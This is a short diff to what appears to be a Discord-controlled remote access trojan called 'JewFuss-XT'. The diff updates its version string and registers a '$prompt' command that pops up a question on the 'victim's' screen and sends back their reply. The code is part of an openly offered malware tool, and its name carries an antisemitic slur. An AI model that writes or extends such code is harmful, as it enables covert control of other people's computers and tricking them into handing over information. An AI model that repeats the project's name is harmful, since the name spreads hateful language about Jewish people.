@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.9" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.10" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -109,6 +109,7 @@ async def update(ctx):
     except Exception as e:
         await ctx.send(f"Could not process the update. {e}")
         
+@bot.command(help="send a popup prompt for victim to reply with, includes default response, `|` indicates start of default answer ", usage="$prompt <question> [| <default answer>]")
 async def prompt(ctx, *, question_and_default: str = ""):
     await ctx.send("✅ Prompt sent to victim. Waiting for input...")
     
